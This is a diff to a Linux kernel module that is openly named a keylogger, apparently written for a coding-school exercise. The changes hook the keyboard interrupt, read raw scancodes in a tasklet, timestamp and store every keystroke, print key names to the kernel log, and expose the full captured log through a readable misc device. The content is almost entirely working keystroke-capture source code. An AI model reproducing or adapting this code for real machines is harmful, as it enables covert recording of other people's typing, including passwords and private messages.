@@ -10,9 +10,14 @@ static LIST_HEAD(strokehead);
 */
 static void *line_id = &strokehead;
 
+static void irq_keylogger(unsigned long data);
+
+DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);
+
 static struct file_operations misc_fops = {
+	.owner = THIS_MODULE,
 	.open = my_open,
-	.read = my_read,
+	.read = seq_read
 };
 
 static struct miscdevice misc_s = {
@@ -21,18 +26,28 @@ static struct miscdevice misc_s = {
 	.fops = &misc_fops
 };
 
-int my_open(struct inode *toto, struct file *tata)
+static int keylogger_show(struct seq_file *seq, void *v)
 {
-	printk("Hello u opened me boyyy\n");
+	struct stroke_s *cur;
+
+	list_for_each_entry(cur, &strokehead, list)
+	{
+		seq_printf(seq, "Key = %d, Name = %s\n", cur->key, keytable[cur->key].name);
+	}
 	return 0;
 }
 
+int my_open(struct inode *inode, struct file *file)
+{
+	return single_open(file, keylogger_show, NULL);
+}
+/*
 ssize_t my_read(struct file *f, char __user *buf, size_t size, loff_t *pos)
 {
-	printk("U tried to read from da keylogger\n");
+	
 	return 0;
 }
-
+*/
 static void get_time(struct tm *time)
 {
 	struct timeval tv;
@@ -40,31 +55,37 @@ static void get_time(struct tm *time)
 	do_gettimeofday(&tv);
 
 	/*
-	 * time_to_tm converts calendar time to tm struct, that is mode user
-	 * friendly. totalsecs in calibrated on UTC, so we add 1 hour as
+	 * time_to_tm converts calendar time to tm struct.
+	 * totalsecs is calibrated on UTC, so we add 1 hour to
 	 * offset to get GMT+1
 	*/
 	time_to_tm(tv.tv_sec, 3600, time);
 }
 
-static irqreturn_t irq_handler(int irq, void *dev_id)
+static void irq_keylogger(unsigned long data)
 {
 	int scancode = inb(0x60);
 	struct stroke_s *keystroke;
 
 	keystroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
 	if (!keystroke)
-		return IRQ_HANDLED;
+		return ;
 	keystroke->state = scancode & 0x80;
 	keystroke->key = scancode & ~0x80;
 	get_time(&keystroke->time);
+//	printk("KEY = %d\n", keystroke->key);
+
+	if (keystroke->key < keytable_len && keystroke->state)
+		printk("KEY = %d, NAME = %s\n", \
+			keystroke->key, \
+			keytable[keystroke->key].name);
+	
 	list_add_tail(&keystroke->list, &strokehead);
-	pr_info("%.2d:%.2d:%.2d || Key = %d, PRESSED\n", \
-			keystroke->time.tm_hour, \
-			keystroke->time.tm_min, \
-			keystroke->time.tm_sec, \
-			keystroke->key);
-	}
+}
+
+static irqreturn_t irq_handler(int irq, void *dev_id)
+{
+	tasklet_schedule(&tasklet_s);
 	return IRQ_HANDLED;
 }
 
@@ -75,7 +96,7 @@ static int __init init_keyboard(void)
 	ret = request_irq(1,			\
 			irq_handler,		\
 			IRQF_SHARED,		\
-			"my_keyboard_42",	\
+			"keylogger42",	\
 			line_id);
 	if (ret)
 		return ret;
@@ -98,6 +119,7 @@ static void __exit exit_keyboard(void)
 {
 	free_list();
 	free_irq(1, line_id);
+	tasklet_kill(&tasklet_s);
 	pr_info("UNLOADED -- 42 keylogger module.\n");
 	misc_deregister(&misc_s);
 }
